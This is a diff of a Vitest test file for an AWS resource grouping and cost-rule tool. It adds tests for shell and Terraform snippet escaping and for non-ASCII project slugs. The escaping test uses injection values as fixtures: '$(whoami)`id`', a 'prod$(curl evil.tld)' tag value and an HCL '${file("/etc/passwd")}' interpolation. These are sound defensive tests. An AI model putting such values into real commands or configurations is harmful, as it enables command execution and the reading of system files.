@@ -1,10 +1,18 @@
 import { describe, expect, it } from "vitest";
 import { getDemoAwsResources } from "@/lib/aws/demo-provider";
-import { ORPHANED_PROJECT_SLUG, type DiscoveredAwsResource } from "@/lib/domain/types";
-import { groupAndPriceResources } from "@/lib/grouping/project-grouper";
+import {
+  ORPHANED_PROJECT_SLUG,
+  slugifyProject,
+  type DiscoveredAwsResource,
+} from "@/lib/domain/types";
+import {
+  buildTagResourcesCli,
+  buildTerraformDefaultTags,
+  groupAndPriceResources,
+} from "@/lib/grouping/project-grouper";
 import { evaluateCostRules } from "@/lib/rules/cost-rules";
 
-describe("Retroactive 4-layer project grouping & cost rule engine", () => {
+describe("Retroactive 4-layer project grouping, shell escaping & cost rule engine", () => {
   it("enforces priority: arn_override > tag > prefix > parent > __orphaned__", () => {
     const resources: DiscoveredAwsResource[] = [
       {
@@ -70,7 +78,6 @@ describe("Retroactive 4-layer project grouping & cost rule engine", () => {
     const byId = new Map(grouped.map((r) => [r.resourceId, r]));
     expect(byId.get("i-tagged")?.projectSlug).toBe("override-app");
     expect(byId.get("i-tagged")?.projectSource).toBe("override");
-    // Child EBS inherits parent EC2's resolved project!
     expect(byId.get("vol-child")?.projectSlug).toBe("override-app");
     expect(byId.get("vol-child")?.projectSource).toBe("parent");
     expect(byId.get("i-prefix")?.projectSlug).toBe("kaluna");
@@ -95,14 +102,32 @@ describe("Retroactive 4-layer project grouping & cost rule engine", () => {
     expect(codes.has("IDLE_NAT_GATEWAY")).toBe(true);
     expect(codes.has("UNTAGGED_RESOURCE")).toBe(true);
 
-    // Verify RDS 7-day countdown reports ~48h remaining when stopped 5 days ago
     const restartFinding = findings.find((f) => f.ruleCode === "RDS_7DAY_AUTORESTART");
     expect(restartFinding?.severity).toBe("critical");
     expect(restartFinding?.title).toContain("~48h");
 
-    // Verify CloudPress root EBS inherited CloudPress via parent EC2 (not orphaned!)
     const rootVol = priced.find((r) => r.resourceId === "vol-0cp0001");
     expect(rootVol?.projectSlug).toBe("cloudpress");
     expect(rootVol?.projectSource).toBe("parent");
+  });
+
+  it("neutralizes shell command substitution and HCL template interpolation in generated snippets", () => {
+    const cli = buildTagResourcesCli(
+      ["arn:aws:secretsmanager:us-east-1:123:secret:app/$(whoami)`id`"],
+      'prod$(curl evil.tld)"\'',
+      "us-east-1",
+    );
+    expect(cli).toContain("'arn:aws:secretsmanager:us-east-1:123:secret:app/$(whoami)`id`'");
+    expect(cli).toContain("'Project=prod$(curl evil.tld)\"'\\'''");
+
+    const hcl = buildTerraformDefaultTags('${file("/etc/passwd")} %{if true}');
+    expect(hcl).toContain('$${file(\\"/etc/passwd\\")} %%{if true}');
+  });
+
+  it("preserves non-ASCII project tags as distinct slugs instead of colliding with __orphaned__", () => {
+    const slug = slugifyProject("東京システム");
+    expect(slug).not.toBe(ORPHANED_PROJECT_SLUG);
+    expect(slug.startsWith("project-")).toBe(true);
+    expect(slugifyProject("   ")).toBe(ORPHANED_PROJECT_SLUG);
   });
 });
